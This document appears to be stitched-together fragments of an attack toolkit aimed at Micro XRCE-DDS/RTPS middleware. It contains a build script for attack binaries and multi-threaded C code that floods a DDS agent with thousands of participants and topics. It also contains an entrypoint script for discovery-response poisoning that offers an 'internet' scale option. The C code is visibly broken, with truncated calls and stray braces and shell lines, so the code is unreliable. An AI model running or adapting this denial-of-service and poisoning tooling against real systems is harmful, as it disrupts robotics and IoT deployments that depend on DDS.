#!/usr/bin/env bash
mkdir -p bin
mkdir -p logs

C_ATTACKS=(
    "attack_discovery_poison"
)

DDS_CFLAGS="-Wall -Wextra -O2 -I/usr/local/include -I/usr/local/microcdr-2.0.2/include"
DDS_LIBS="-L/usr/local/lib -L/usr/local/microcdr-2.0.2/lib -lmicroxrcedds_client -lmicrocdr -lpthread"

SPECIAL_CFLAGS="-Wall -Wextra -O2"
SPECIAL_LIBS="-lpthread"

for attack in "${C_ATTACKS[@]}"; do
    if [ -f "${attack}.c" ]; then
        gcc ${attack}.c -o bin/$attack ${DDS_CFLAGS} ${DDS_LIBS}
        if [ $? -eq 0 ]; then
            chmod +x bin/$attack
        fi
    fi
done

#include <ucdr/microcdr.h>
#include <stdio.h>
#include <stdlib.h>
#include <unistd.h>
#include <pthread.h>

#define STREAM_HISTORY  8
#define BUFFER_SIZE     UXR_CONFIG_UDP_TRANSPORT_MTU * STREAM_HISTORY
#define MAX_ENTITIES    5000
#define NUM_THREADS     10

typedef struct {
    char* ip;
    char* port;
    int thread_id;
    int entities_per_thread;
} thread_args_t;

void* entity_flood_thread(void* arg) {
    thread_args_t* args = (thread_args_t*)arg;
    
    printf("[Thread %d] Starting entity flood...\n", args->thread_id);
    
    uxrUDPTransport transport;
    if (!uxr_init_udp_transport(&transport, UXR_IPv4, args->ip, args->port)) {
        printf("[Thread %d] Failed to init transport\n", args->thread_id);
        return NULL;
    }
    
    uxrSession session;
    uint32_t session_key = 0xAA000000 + args->thread_id;
    uxr_init_session(&session, &transport.comm, session_key);
    
    if (!uxr_create_session(&session)) {
        printf("[Thread %d] Failed to create session\n", args->thread_id);
        uxr_close_udp_transport(&transport);
        return NULL;
    }
    
    uint8_t output_buffer[BUFFER_SIZE];
    uxrStreamId reliable_out = uxr_create_output_reliable_stream(&session, output_buffer, 
                                                                  BUFFER_SIZE, STREAM_HISTORY);
    
    uint8_t input_buffer[BUFFER_SIZE];
    uxr_create_input_reliable_stream(&session, input_buffer, BUFFER_SIZE, STREAM_HISTORY);
    
    int base_id = args->thread_id * args->entities_per_thread;
    
    for (int i = 0; i < args->entities_per_thread; i++) {
        int entity_num = base_id + i;

        uxrObjectId participant_id = uxr_object_id((entity_num % 128) + 1, UXR_PARTICIPANT_ID);
        char participant_xml[512];
        snprintf(participant_xml, sizeof(participant_xml),
                "<dds><participant><rtps><name>flood_p_%d_%d</name></rtps></participant></dds>",
                args->thread_id, i);
        
        uxr_buffer_create_participant_xml(&session, reliable_out, participant_id, 0,
                                         participant_xml, UXR_REPLACE);
        
        // Create topic
        uxrObjectId topic_id = uxr_object_id(((entity_num + 1) % 128) + 1, UXR_TOPIC_ID);
        char topic_xml[512];
        snprintf(topic_xml, sizeof(topic_xml),
                "<dds><topic><name>FloodTopic_%d_%d</name><dataType>string</dataType></topic></dds>",
                args->thread_id, i);

                                    topic_xml, UXR_REPLACE);
        
        // Create publisher
        uxrObjectId publisher_id = uxr_object_id(((entity_num + 2) % 128) + 1, UXR_PUBLISHER_ID);

        };

#!/usr/bin/env bash
# RTPS discovery-response poisoning (USENIX 2022 DDS-Sec).
# Backward-compatible: $1 = malicious agent IP.
# Env knobs:
#   DURATION  seconds before SIGTERM      (lab:120 | internet:1800)
#   SCALE     lab|internet                (default: lab)
#
# Note: ports 7400 (discovery) and 6666 (rogue) are baked into the C binary.
# Pass `-c attack_discovery_poison.c` rebuild flags to change them upstream.
TARGET="${1:-}"
SCALE="${SCALE:-lab}"
case "${SCALE}" in
  internet) DURATION="${DURATION:-1800}";;
  *)        DURATION="${DURATION:-120}";;
esac

if [ -z "${TARGET}" ]; then
  echo "usage: entrypoint.sh <malicious_agent_ip>   # env: DURATION SCALE"
  exit 1
fi

echo "[xrce-discovery-poison] rogue=${TARGET} duration=${DURATION}s"
exec timeout "${DURATION}" /opt/Micro-XRCE-DDS-Client/bin/attack_discovery_poison "${TARGET}"

    fi
